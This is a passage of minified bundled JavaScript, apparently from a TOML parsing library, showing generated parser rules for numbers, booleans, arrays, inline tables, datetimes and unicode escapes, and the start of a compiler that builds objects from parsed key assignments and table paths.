                Xe++) : (yt = w,
                Kt === 0 && hr(qe))),
                yt !== w ? (xt = ho(),
                xt !== w ? (cr = De,
                ot = Ve(ot, xt),
                De = ot) : (Xe = De,
                De = F)) : (Xe = De,
                De = F)) : (Xe = De,
                De = F),
                De === w && (De = Xe,
                ot = fo(),
                ot !== w && (cr = De,
                ot = lt(ot)),
                De = ot),
                Qt[qt] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function fo() {
                var De, ot, yt, xt, qt, jt, Wt = Xe * 49 + 24, Er = Qt[Wt];
                return Er ? (Xe = Er.nextPos,
                Er.result) : (De = Xe,
                O.charCodeAt(Xe) === 43 ? (ot = nt,
                Xe++) : (ot = w,
                Kt === 0 && hr(je)),
                ot === w && (ot = te),
                ot !== w ? (yt = Xe,
                xt = ua(),
                xt !== w ? (O.charCodeAt(Xe) === 46 ? (qt = xe,
                Xe++) : (qt = w,
                Kt === 0 && hr(Ae)),
                qt !== w ? (jt = ua(),
                jt !== w ? (xt = [xt, qt, jt],
                yt = xt) : (Xe = yt,
                yt = F)) : (Xe = yt,
                yt = F)) : (Xe = yt,
                yt = F),
                yt !== w ? (cr = De,
                ot = Ke(yt),
                De = ot) : (Xe = De,
                De = F)) : (Xe = De,
                De = F),
                De === w && (De = Xe,
                O.charCodeAt(Xe) === 45 ? (ot = Qe,
                Xe++) : (ot = w,
                Kt === 0 && hr(We)),
                ot !== w ? (yt = Xe,
                xt = ua(),
                xt !== w ? (O.charCodeAt(Xe) === 46 ? (qt = xe,
                Xe++) : (qt = w,
                Kt === 0 && hr(Ae)),
                qt !== w ? (jt = ua(),
                jt !== w ? (xt = [xt, qt, jt],
                yt = xt) : (Xe = yt,
                yt = F)) : (Xe = yt,
                yt = F)) : (Xe = yt,
                yt = F),
                yt !== w ? (cr = De,
                ot = mt(yt),
                De = ot) : (Xe = De,
                De = F)) : (Xe = De,
                De = F)),
                Qt[Wt] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function hu() {
                var De, ot, yt = Xe * 49 + 25, xt = Qt[yt];
                return xt ? (Xe = xt.nextPos,
                xt.result) : (De = Xe,
                ot = ho(),
                ot !== w && (cr = De,
                ot = ct(ot)),
                De = ot,
                Qt[yt] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function ho() {
                var De, ot, yt, xt, qt, jt = Xe * 49 + 26, Wt = Qt[jt];
                if (Wt)
                    return Xe = Wt.nextPos,
                    Wt.result;
                if (De = Xe,
                O.charCodeAt(Xe) === 43 ? (ot = nt,
                Xe++) : (ot = w,
                Kt === 0 && hr(je)),
                ot === w && (ot = te),
                ot !== w) {
                    if (yt = [],
                    xt = Yr(),
                    xt !== w)
                        for (; xt !== w; )
                            yt.push(xt),
                            xt = Yr();
                    else
                        yt = F;
                    yt !== w ? (xt = Xe,
                    Kt++,
                    O.charCodeAt(Xe) === 46 ? (qt = xe,
                    Xe++) : (qt = w,
                    Kt === 0 && hr(Ae)),
                    Kt--,
                    qt === w ? xt = Q : (Xe = xt,
                    xt = F),
                    xt !== w ? (cr = De,
                    ot = Ke(yt),
                    De = ot) : (Xe = De,
                    De = F)) : (Xe = De,
                    De = F)
                } else
                    Xe = De,
                    De = F;
                if (De === w)
                    if (De = Xe,
                    O.charCodeAt(Xe) === 45 ? (ot = Qe,
                    Xe++) : (ot = w,
                    Kt === 0 && hr(We)),
                    ot !== w) {
                        if (yt = [],
                        xt = Yr(),
                        xt !== w)
                            for (; xt !== w; )
                                yt.push(xt),
                                xt = Yr();
                        else
                            yt = F;
                        yt !== w ? (xt = Xe,
                        Kt++,
                        O.charCodeAt(Xe) === 46 ? (qt = xe,
                        Xe++) : (qt = w,
                        Kt === 0 && hr(Ae)),
                        Kt--,
                        qt === w ? xt = Q : (Xe = xt,
                        xt = F),
                        xt !== w ? (cr = De,
                        ot = mt(yt),
                        De = ot) : (Xe = De,
                        De = F)) : (Xe = De,
                        De = F)
                    } else
                        Xe = De,
                        De = F;
                return Qt[jt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function pu() {
                var De, ot, yt = Xe * 49 + 27, xt = Qt[yt];
                return xt ? (Xe = xt.nextPos,
                xt.result) : (De = Xe,
                O.substr(Xe, 4) === vt ? (ot = vt,
                Xe += 4) : (ot = w,
                Kt === 0 && hr(we)),
                ot !== w && (cr = De,
                ot = _e()),
                De = ot,
                De === w && (De = Xe,
                O.substr(Xe, 5) === Ce ? (ot = Ce,
                Xe += 5) : (ot = w,
                Kt === 0 && hr(st)),
                ot !== w && (cr = De,
                ot = et()),
                De = ot),
                Qt[yt] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function po() {
                var De, ot, yt, xt, qt, jt = Xe * 49 + 28, Wt = Qt[jt];
                if (Wt)
                    return Xe = Wt.nextPos,
                    Wt.result;
                if (De = Xe,
                O.charCodeAt(Xe) === 91 ? (ot = ae,
                Xe++) : (ot = w,
                Kt === 0 && hr(ne)),
                ot !== w) {
                    for (yt = [],
                    xt = Dn(); xt !== w; )
                        yt.push(xt),
                        xt = Dn();
                    yt !== w ? (O.charCodeAt(Xe) === 93 ? (xt = oe,
                    Xe++) : (xt = w,
                    Kt === 0 && hr(ue)),
                    xt !== w ? (cr = De,
                    ot = tt(),
                    De = ot) : (Xe = De,
                    De = F)) : (Xe = De,
                    De = F)
                } else
                    Xe = De,
                    De = F;
                if (De === w && (De = Xe,
                O.charCodeAt(Xe) === 91 ? (ot = ae,
                Xe++) : (ot = w,
                Kt === 0 && hr(ne)),
                ot !== w ? (yt = os(),
                yt === w && (yt = te),
                yt !== w ? (O.charCodeAt(Xe) === 93 ? (xt = oe,
                Xe++) : (xt = w,
                Kt === 0 && hr(ue)),
                xt !== w ? (cr = De,
                ot = He(yt),
                De = ot) : (Xe = De,
                De = F)) : (Xe = De,
                De = F)) : (Xe = De,
                De = F),
                De === w)) {
                    if (De = Xe,
                    O.charCodeAt(Xe) === 91 ? (ot = ae,
                    Xe++) : (ot = w,
                    Kt === 0 && hr(ne)),
                    ot !== w) {
                        if (yt = [],
                        xt = ka(),
                        xt !== w)
                            for (; xt !== w; )
                                yt.push(xt),
                                xt = ka();
                        else
                            yt = F;
                        yt !== w ? (O.charCodeAt(Xe) === 93 ? (xt = oe,
                        Xe++) : (xt = w,
                        Kt === 0 && hr(ue)),
                        xt !== w ? (cr = De,
                        ot = ke(yt),
                        De = ot) : (Xe = De,
                        De = F)) : (Xe = De,
                        De = F)
                    } else
                        Xe = De,
                        De = F;
                    if (De === w)
                        if (De = Xe,
                        O.charCodeAt(Xe) === 91 ? (ot = ae,
                        Xe++) : (ot = w,
                        Kt === 0 && hr(ne)),
                        ot !== w) {
                            if (yt = [],
                            xt = ka(),
                            xt !== w)
                                for (; xt !== w; )
                                    yt.push(xt),
                                    xt = ka();
                            else
                                yt = F;
                            yt !== w ? (xt = os(),
                            xt !== w ? (O.charCodeAt(Xe) === 93 ? (qt = oe,
                            Xe++) : (qt = w,
                            Kt === 0 && hr(ue)),
                            qt !== w ? (cr = De,
                            ot = Me(yt, xt),
                            De = ot) : (Xe = De,
                            De = F)) : (Xe = De,
                            De = F)) : (Xe = De,
                            De = F)
                        } else
                            Xe = De,
                            De = F
                }
                return Qt[jt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function os() {
                var De, ot, yt, xt, qt, jt = Xe * 49 + 29, Wt = Qt[jt];
                if (Wt)
                    return Xe = Wt.nextPos,
                    Wt.result;
                for (De = Xe,
                ot = [],
                yt = Dn(); yt !== w; )
                    ot.push(yt),
                    yt = Dn();
                if (ot !== w)
                    if (yt = oi(),
                    yt !== w) {
                        for (xt = [],
                        qt = Dn(); qt !== w; )
                            xt.push(qt),
                            qt = Dn();
                        xt !== w ? (cr = De,
                        ot = Ue(yt),
                        De = ot) : (Xe = De,
                        De = F)
                    } else
                        Xe = De,
                        De = F;
                else
                    Xe = De,
                    De = F;
                return Qt[jt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function ka() {
                var De, ot, yt, xt, qt, jt, Wt, Er = Xe * 49 + 30, Ir = Qt[Er];
                if (Ir)
                    return Xe = Ir.nextPos,
                    Ir.result;
                for (De = Xe,
                ot = [],
                yt = Dn(); yt !== w; )
                    ot.push(yt),
                    yt = Dn();
                if (ot !== w)
                    if (yt = oi(),
                    yt !== w) {
                        for (xt = [],
                        qt = Dn(); qt !== w; )
                            xt.push(qt),
                            qt = Dn();
                        if (xt !== w)
                            if (O.charCodeAt(Xe) === 44 ? (qt = rt,
                            Xe++) : (qt = w,
                            Kt === 0 && hr(dt)),
                            qt !== w) {
                                for (jt = [],
                                Wt = Dn(); Wt !== w; )
                                    jt.push(Wt),
                                    Wt = Dn();
                                jt !== w ? (cr = De,
                                ot = Ue(yt),
                                De = ot) : (Xe = De,
                                De = F)
                            } else
                                Xe = De,
                                De = F;
                        else
                            Xe = De,
                            De = F
                    } else
                        Xe = De,
                        De = F;
                else
                    Xe = De,
                    De = F;
                return Qt[Er] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function Dn() {
                var De, ot = Xe * 49 + 31, yt = Qt[ot];
                return yt ? (Xe = yt.nextPos,
                yt.result) : (De = Rr(),
                De === w && (De = Ln(),
                De === w && (De = aa())),
                Qt[ot] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function mu() {
                var De, ot, yt, xt, qt, jt, Wt = Xe * 49 + 32, Er = Qt[Wt];
                if (Er)
                    return Xe = Er.nextPos,
                    Er.result;
                if (De = Xe,
                O.charCodeAt(Xe) === 123 ? (ot = Et,
                Xe++) : (ot = w,
                Kt === 0 && hr(ft)),
                ot !== w) {
                    for (yt = [],
                    xt = Rr(); xt !== w; )
                        yt.push(xt),
                        xt = Rr();
                    if (yt !== w) {
                        for (xt = [],
                        qt = ss(); qt !== w; )
                            xt.push(qt),
                            qt = ss();
                        if (xt !== w) {
                            for (qt = [],
                            jt = Rr(); jt !== w; )
                                qt.push(jt),
                                jt = Rr();
                            qt !== w ? (O.charCodeAt(Xe) === 125 ? (jt = gt,
                            Xe++) : (jt = w,
                            Kt === 0 && hr(Yt)),
                            jt !== w ? (cr = De,
                            ot = Ct(xt),
                            De = ot) : (Xe = De,
                            De = F)) : (Xe = De,
                            De = F)
                        } else
                            Xe = De,
                            De = F
                    } else
                        Xe = De,
                        De = F
                } else
                    Xe = De,
                    De = F;
                return Qt[Wt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function ss() {
                var De, ot, yt, xt, qt, jt, Wt, Er, Ir, Qr, Gr, fn = Xe * 49 + 33, ln = Qt[fn];
                if (ln)
                    return Xe = ln.nextPos,
                    ln.result;
                for (De = Xe,
                ot = [],
                yt = Rr(); yt !== w; )
                    ot.push(yt),
                    yt = Rr();
                if (ot !== w)
                    if (yt = ci(),
                    yt !== w) {
                        for (xt = [],
                        qt = Rr(); qt !== w; )
                            xt.push(qt),
                            qt = Rr();
                        if (xt !== w)
                            if (O.charCodeAt(Xe) === 61 ? (qt = Ee,
                            Xe++) : (qt = w,
                            Kt === 0 && hr(Be)),
                            qt !== w) {
                                for (jt = [],
                                Wt = Rr(); Wt !== w; )
                                    jt.push(Wt),
                                    Wt = Rr();
                                if (jt !== w)
                                    if (Wt = oi(),
                                    Wt !== w) {
                                        for (Er = [],
                                        Ir = Rr(); Ir !== w; )
                                            Er.push(Ir),
                                            Ir = Rr();
                                        if (Er !== w)
                                            if (O.charCodeAt(Xe) === 44 ? (Ir = rt,
                                            Xe++) : (Ir = w,
                                            Kt === 0 && hr(dt)),
                                            Ir !== w) {
                                                for (Qr = [],
                                                Gr = Rr(); Gr !== w; )
                                                    Qr.push(Gr),
                                                    Gr = Rr();
                                                Qr !== w ? (cr = De,
                                                ot = Ot(yt, Wt),
                                                De = ot) : (Xe = De,
                                                De = F)
                                            } else
                                                Xe = De,
                                                De = F;
                                        else
                                            Xe = De,
                                            De = F
                                    } else
                                        Xe = De,
                                        De = F;
                                else
                                    Xe = De,
                                    De = F
                            } else
                                Xe = De,
                                De = F;
                        else
                            Xe = De,
                            De = F
                    } else
                        Xe = De,
                        De = F;
                else
                    Xe = De,
                    De = F;
                if (De === w) {
                    for (De = Xe,
                    ot = [],
                    yt = Rr(); yt !== w; )
                        ot.push(yt),
                        yt = Rr();
                    if (ot !== w)
                        if (yt = ci(),
                        yt !== w) {
                            for (xt = [],
                            qt = Rr(); qt !== w; )
                                xt.push(qt),
                                qt = Rr();
                            if (xt !== w)
                                if (O.charCodeAt(Xe) === 61 ? (qt = Ee,
                                Xe++) : (qt = w,
                                Kt === 0 && hr(Be)),
                                qt !== w) {
                                    for (jt = [],
                                    Wt = Rr(); Wt !== w; )
                                        jt.push(Wt),
                                        Wt = Rr();
                                    jt !== w ? (Wt = oi(),
                                    Wt !== w ? (cr = De,
                                    ot = Ot(yt, Wt),
                                    De = ot) : (Xe = De,
                                    De = F)) : (Xe = De,
                                    De = F)
                                } else
                                    Xe = De,
                                    De = F;
                            else
                                Xe = De,
                                De = F
                        } else
                            Xe = De,
                            De = F;
                    else
                        Xe = De,
                        De = F
                }
                return Qt[fn] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function mo() {
                var De, ot, yt, xt = Xe * 49 + 34, qt = Qt[xt];
                return qt ? (Xe = qt.nextPos,
                qt.result) : (De = Xe,
                O.charCodeAt(Xe) === 46 ? (ot = xe,
                Xe++) : (ot = w,
                Kt === 0 && hr(Ae)),
                ot !== w ? (yt = ua(),
                yt !== w ? (cr = De,
                ot = Vt(yt),
                De = ot) : (Xe = De,
                De = F)) : (Xe = De,
                De = F),
                Qt[xt] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function us() {
                var De, ot, yt, xt, qt, jt, Wt, Er, Ir, Qr, Gr, fn, ln = Xe * 49 + 35, En = Qt[ln];
                return En ? (Xe = En.nextPos,
                En.result) : (De = Xe,
                ot = Xe,
                yt = Yr(),
                yt !== w ? (xt = Yr(),
                xt !== w ? (qt = Yr(),
                qt !== w ? (jt = Yr(),
                jt !== w ? (O.charCodeAt(Xe) === 45 ? (Wt = Qe,
                Xe++) : (Wt = w,
                Kt === 0 && hr(We)),
                Wt !== w ? (Er = Yr(),
                Er !== w ? (Ir = Yr(),
                Ir !== w ? (O.charCodeAt(Xe) === 45 ? (Qr = Qe,
                Xe++) : (Qr = w,
                Kt === 0 && hr(We)),
                Qr !== w ? (Gr = Yr(),
                Gr !== w ? (fn = Yr(),
                fn !== w ? (yt = [yt, xt, qt, jt, Wt, Er, Ir, Qr, Gr, fn],
                ot = yt) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F),
                ot !== w && (cr = De,
                ot = Pt(ot)),
                De = ot,
                Qt[ln] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function vu() {
                var De, ot, yt, xt, qt, jt, Wt, Er, Ir, Qr, Gr, fn = Xe * 49 + 36, ln = Qt[fn];
                return ln ? (Xe = ln.nextPos,
                ln.result) : (De = Xe,
                ot = Xe,
                yt = Yr(),
                yt !== w ? (xt = Yr(),
                xt !== w ? (O.charCodeAt(Xe) === 58 ? (qt = Bt,
                Xe++) : (qt = w,
                Kt === 0 && hr(xr)),
                qt !== w ? (jt = Yr(),
                jt !== w ? (Wt = Yr(),
                Wt !== w ? (O.charCodeAt(Xe) === 58 ? (Er = Bt,
                Xe++) : (Er = w,
                Kt === 0 && hr(xr)),
                Er !== w ? (Ir = Yr(),
                Ir !== w ? (Qr = Yr(),
                Qr !== w ? (Gr = mo(),
                Gr === w && (Gr = te),
                Gr !== w ? (yt = [yt, xt, qt, jt, Wt, Er, Ir, Qr, Gr],
                ot = yt) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F),
                ot !== w && (cr = De,
                ot = Dt(ot)),
                De = ot,
                Qt[fn] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function yu() {
                var De, ot, yt, xt, qt, jt, Wt, Er, Ir, Qr, Gr, fn, ln, En, $i, zn, Bn, go = Xe * 49 + 37, ca = Qt[go];
                return ca ? (Xe = ca.nextPos,
                ca.result) : (De = Xe,
                ot = Xe,
                yt = Yr(),
                yt !== w ? (xt = Yr(),
                xt !== w ? (O.charCodeAt(Xe) === 58 ? (qt = Bt,
                Xe++) : (qt = w,
                Kt === 0 && hr(xr)),
                qt !== w ? (jt = Yr(),
                jt !== w ? (Wt = Yr(),
                Wt !== w ? (O.charCodeAt(Xe) === 58 ? (Er = Bt,
                Xe++) : (Er = w,
                Kt === 0 && hr(xr)),
                Er !== w ? (Ir = Yr(),
                Ir !== w ? (Qr = Yr(),
                Qr !== w ? (Gr = mo(),
                Gr === w && (Gr = te),
                Gr !== w ? (O.charCodeAt(Xe) === 45 ? (fn = Qe,
                Xe++) : (fn = w,
                Kt === 0 && hr(We)),
                fn === w && (O.charCodeAt(Xe) === 43 ? (fn = nt,
                Xe++) : (fn = w,
                Kt === 0 && hr(je))),
                fn !== w ? (ln = Yr(),
                ln !== w ? (En = Yr(),
                En !== w ? (O.charCodeAt(Xe) === 58 ? ($i = Bt,
                Xe++) : ($i = w,
                Kt === 0 && hr(xr)),
                $i !== w ? (zn = Yr(),
                zn !== w ? (Bn = Yr(),
                Bn !== w ? (yt = [yt, xt, qt, jt, Wt, Er, Ir, Qr, Gr, fn, ln, En, $i, zn, Bn],
                ot = yt) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F)) : (Xe = ot,
                ot = F),
                ot !== w && (cr = De,
                ot = Dt(ot)),
                De = ot,
                Qt[go] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function gu() {
                var De, ot, yt, xt, qt, jt = Xe * 49 + 38, Wt = Qt[jt];
                return Wt ? (Xe = Wt.nextPos,
                Wt.result) : (De = Xe,
                ot = us(),
                ot !== w ? (O.charCodeAt(Xe) === 84 ? (yt = Ft,
                Xe++) : (yt = w,
                Kt === 0 && hr(Mr)),
                yt !== w ? (xt = vu(),
                xt !== w ? (O.charCodeAt(Xe) === 90 ? (qt = at,
                Xe++) : (qt = w,
                Kt === 0 && hr(ze)),
                qt !== w ? (cr = De,
                ot = Je(ot, xt),
                De = ot) : (Xe = De,
                De = F)) : (Xe = De,
                De = F)) : (Xe = De,
                De = F)) : (Xe = De,
                De = F),
                De === w && (De = Xe,
                ot = us(),
                ot !== w ? (O.charCodeAt(Xe) === 84 ? (yt = Ft,
                Xe++) : (yt = w,
                Kt === 0 && hr(Mr)),
                yt !== w ? (xt = yu(),
                xt !== w ? (cr = De,
                ot = ht(ot, xt),
                De = ot) : (Xe = De,
                De = F)) : (Xe = De,
                De = F)) : (Xe = De,
                De = F)),
                Qt[jt] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function Rr() {
                var De, ot = Xe * 49 + 39, yt = Qt[ot];
                return yt ? (Xe = yt.nextPos,
                yt.result) : (_t.test(O.charAt(Xe)) ? (De = O.charAt(Xe),
                Xe++) : (De = w,
                Kt === 0 && hr(Ge)),
                Qt[ot] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function Ln() {
                var De, ot, yt, xt = Xe * 49 + 40, qt = Qt[xt];
                return qt ? (Xe = qt.nextPos,
                qt.result) : (O.charCodeAt(Xe) === 10 ? (De = Ye,
                Xe++) : (De = w,
                Kt === 0 && hr(it)),
                De === w && (De = Xe,
                O.charCodeAt(Xe) === 13 ? (ot = Fe,
                Xe++) : (ot = w,
                Kt === 0 && hr(ut)),
                ot !== w ? (O.charCodeAt(Xe) === 10 ? (yt = Ye,
                Xe++) : (yt = w,
                Kt === 0 && hr(it)),
                yt !== w ? (ot = [ot, yt],
                De = ot) : (Xe = De,
                De = F)) : (Xe = De,
                De = F)),
                Qt[xt] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function ls() {
                var De, ot = Xe * 49 + 41, yt = Qt[ot];
                return yt ? (Xe = yt.nextPos,
                yt.result) : (De = Ln(),
                De === w && (De = Rr()),
                Qt[ot] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function Oa() {
                var De, ot, yt = Xe * 49 + 42, xt = Qt[yt];
                return xt ? (Xe = xt.nextPos,
                xt.result) : (De = Xe,
                Kt++,
                O.length > Xe ? (ot = O.charAt(Xe),
                Xe++) : (ot = w,
                Kt === 0 && hr(ee)),
                Kt--,
                ot === w ? De = Q : (Xe = De,
                De = F),
                Qt[yt] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function $n() {
                var De, ot = Xe * 49 + 43, yt = Qt[ot];
                return yt ? (Xe = yt.nextPos,
                yt.result) : (wt.test(O.charAt(Xe)) ? (De = O.charAt(Xe),
                Xe++) : (De = w,
                Kt === 0 && hr(At)),
                Qt[ot] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function Yr() {
                var De, ot, yt = Xe * 49 + 44, xt = Qt[yt];
                return xt ? (Xe = xt.nextPos,
                xt.result) : (St.test(O.charAt(Xe)) ? (De = O.charAt(Xe),
                Xe++) : (De = w,
                Kt === 0 && hr(Tt)),
                De === w && (De = Xe,
                O.charCodeAt(Xe) === 95 ? (ot = er,
                Xe++) : (ot = w,
                Kt === 0 && hr(Xt)),
                ot !== w && (cr = De,
                ot = pr()),
                De = ot),
                Qt[yt] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function cs() {
                var De, ot = Xe * 49 + 45, yt = Qt[ot];
                return yt ? (Xe = yt.nextPos,
                yt.result) : (or.test(O.charAt(Xe)) ? (De = O.charAt(Xe),
                Xe++) : (De = w,
                Kt === 0 && hr(yr)),
                Qt[ot] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function ua() {
                var De, ot, yt, xt = Xe * 49 + 46, qt = Qt[xt];
                if (qt)
                    return Xe = qt.nextPos,
                    qt.result;
                if (De = Xe,
                ot = [],
                yt = Yr(),
                yt !== w)
                    for (; yt !== w; )
                        ot.push(yt),
                        yt = Yr();
                else
                    ot = F;
                return ot !== w && (cr = De,
                ot = vr(ot)),
                De = ot,
                Qt[xt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function fs() {
                var De, ot, yt = Xe * 49 + 47, xt = Qt[yt];
                return xt ? (Xe = xt.nextPos,
                xt.result) : (De = Xe,
                O.substr(Xe, 2) === gr ? (ot = gr,
                Xe += 2) : (ot = w,
                Kt === 0 && hr(Sr)),
                ot !== w && (cr = De,
                ot = br()),
                De = ot,
                De === w && (De = Xe,
                O.substr(Xe, 2) === _r ? (ot = _r,
                Xe += 2) : (ot = w,
                Kt === 0 && hr(wr)),
                ot !== w && (cr = De,
                ot = sr()),
                De = ot,
                De === w && (De = Xe,
                O.substr(Xe, 2) === dr ? (ot = dr,
                Xe += 2) : (ot = w,
                Kt === 0 && hr(nr)),
                ot !== w && (cr = De,
                ot = lr()),
                De = ot,
                De === w && (De = Xe,
                O.substr(Xe, 2) === fr ? (ot = fr,
                Xe += 2) : (ot = w,
                Kt === 0 && hr(ir)),
                ot !== w && (cr = De,
                ot = $t()),
                De = ot,
                De === w && (De = Xe,
                O.substr(Xe, 2) === Nt ? (ot = Nt,
                Xe += 2) : (ot = w,
                Kt === 0 && hr(ar)),
                ot !== w && (cr = De,
                ot = Zt()),
                De = ot,
                De === w && (De = Xe,
                O.substr(Xe, 2) === Gt ? (ot = Gt,
                Xe += 2) : (ot = w,
                Kt === 0 && hr(ur)),
                ot !== w && (cr = De,
                ot = Tr()),
                De = ot,
                De === w && (De = Xe,
                O.substr(Xe, 2) === Or ? (ot = Or,
                Xe += 2) : (ot = w,
                Kt === 0 && hr(Nr)),
                ot !== w && (cr = De,
                ot = Br()),
                De = ot,
                De === w && (De = bu()))))))),
                Qt[yt] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function bu() {
                var De, ot, yt, xt, qt, jt, Wt, Er, Ir, Qr, Gr, fn = Xe * 49 + 48, ln = Qt[fn];
                return ln ? (Xe = ln.nextPos,
                ln.result) : (De = Xe,
                O.substr(Xe, 2) === Rt ? (ot = Rt,
                Xe += 2) : (ot = w,
                Kt === 0 && hr(Cr)),
                ot !== w ? (yt = Xe,
                xt = $n(),
                xt !== w ? (qt = $n(),
                qt !== w ? (jt = $n(),
                jt !== w ? (Wt = $n(),
                Wt !== w ? (Er = $n(),
                Er !== w ? (Ir = $n(),
                Ir !== w ? (Qr = $n(),
                Qr !== w ? (Gr = $n(),
                Gr !== w ? (xt = [xt, qt, jt, Wt, Er, Ir, Qr, Gr],
                yt = xt) : (Xe = yt,
                yt = F)) : (Xe = yt,
                yt = F)) : (Xe = yt,
                yt = F)) : (Xe = yt,
                yt = F)) : (Xe = yt,
                yt = F)) : (Xe = yt,
                yt = F)) : (Xe = yt,
                yt = F)) : (Xe = yt,
                yt = F),
                yt !== w ? (cr = De,
                ot = Lr(yt),
                De = ot) : (Xe = De,
                De = F)) : (Xe = De,
                De = F),
                De === w && (De = Xe,
                O.substr(Xe, 2) === Ur ? (ot = Ur,
                Xe += 2) : (ot = w,
                Kt === 0 && hr(Dr)),
                ot !== w ? (yt = Xe,
                xt = $n(),
                xt !== w ? (qt = $n(),
                qt !== w ? (jt = $n(),
                jt !== w ? (Wt = $n(),
                Wt !== w ? (xt = [xt, qt, jt, Wt],
                yt = xt) : (Xe = yt,
                yt = F)) : (Xe = yt,
                yt = F)) : (Xe = yt,
                yt = F)) : (Xe = yt,
                yt = F),
                yt !== w ? (cr = De,
                ot = Lr(yt),
                De = ot) : (Xe = De,
                De = F)) : (Xe = De,
                De = F)),
                Qt[fn] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            var ds = [];
            function _u(De, ot, yt) {
                var xt = new Error(De);
                throw xt.line = ot,
                xt.column = yt,
                xt
            }
            function vo(De) {
                ds.push(De)
            }
            function Sn(De, ot, yt, xt, qt) {
                var jt = {
                    type: De,
                    value: ot,
                    line: yt(),
                    column: xt()
                };
                return qt && (jt.key = qt),
                jt
            }
            function yo(De, ot, yt) {
                var xt = parseInt("0x" + De);
                if (!isFinite(xt) || Math.floor(xt) != xt || xt < 0 || xt > 1114111 || xt > 55295 && xt < 57344)
                    _u("Invalid Unicode escape code: " + De, ot, yt);
                else
                    return la(xt)
            }
            function la() {
                var De = 16384, ot = [], yt, xt, qt = -1, jt = arguments.length;
                if (!jt)
                    return "";
                for (var Wt = ""; ++qt < jt; ) {
                    var Er = Number(arguments[qt]);
                    Er <= 65535 ? ot.push(Er) : (Er -= 65536,
                    yt = (Er >> 10) + 55296,
                    xt = Er % 1024 + 56320,
                    ot.push(yt, xt)),
                    (qt + 1 == jt || ot.length > De) && (Wt += String.fromCharCode.apply(null, ot),
                    ot.length = 0)
                }
                return Wt
            }
            if (pn = X(),
            pn !== w && Xe === O.length)
                return pn;
            throw pn !== w && Xe < O.length && hr({
                type: "end",
                description: "end of input"
            }),
            Oi(null, rn, tn)
        }
        return {
            SyntaxError: M,
            parse: j
        }
    }()),
    parser
}
var compiler, hasRequiredCompiler;
function requireCompiler() {
    if (hasRequiredCompiler)
        return compiler;
    hasRequiredCompiler = 1;
    function _(M) {
        var j = []
          , O = []
          , x = ""
          , w = {}
          , b = w;
        return X(M);
        function X(fe) {
            for (var he, pe = 0; pe < fe.length; pe++)
                switch (he = fe[pe],
                he.type) {
                case "Assign":
                    F(he);
                    break;
                case "ObjectPath":
                    ee(he);
                    break;
                case "ArrayPath":
                    ae(he);
                    break
                }
            return w
        }
        function Y(fe, he, pe) {
            var ye = new Error(fe);
            throw ye.line = he,
            ye.column = pe,
            ye
        }
        function F(fe) {
            var he = fe.key, pe = fe.value, ye = fe.line, be = fe.column, xe;
            x ? xe = x + "." + he : xe = he,
            typeof b[he] < "u" && Y("Cannot redefine existing key '" + xe + "'.", ye, be),
            b[he] = K(pe),
            V(xe) || (j.push(xe),
            O.push(xe))
        }
        function V(fe) {
            return j.indexOf(fe) !== -1
        }
        function K(fe) {
            return fe.type === "Array" ? oe(fe.value) : fe.type === "InlineTable" ? Q(fe.value) : fe.value
        }
        function Q(fe) {
            for (var he = {}, pe = 0; pe < fe.length; pe++) {
                var ye = fe[pe];
                ye.value.type === "InlineTable" ? he[ye.key] = Q(ye.value.value) : ye.type === "InlineTableValue" && (he[ye.key] = K(ye.value))
            }
            return he
        }
        function ee(fe) {
            var he = fe.value
              , pe = he.map(ue).join(".")
              , ye = fe.line
              , be = fe.column;
            V(pe) && Y("Cannot redefine existing key '" + he + "'.", ye, be),
            j.push(pe),
            b = ne(w, he, {}, ye, be),
            x = he
        }
        function ae(fe) {
            var he = fe.value
              , pe = he.map(ue).join(".")
              , ye = fe.line
              , be = fe.column;
            if (V(pe) || j.push(pe),
            j = j.filter(function(Ae) {
                return Ae.indexOf(pe) !== 0
            }),
            j.push(pe),
            b = ne(w, he, [], ye, be),
            x = pe,
            b instanceof Array) {
                var xe = {};
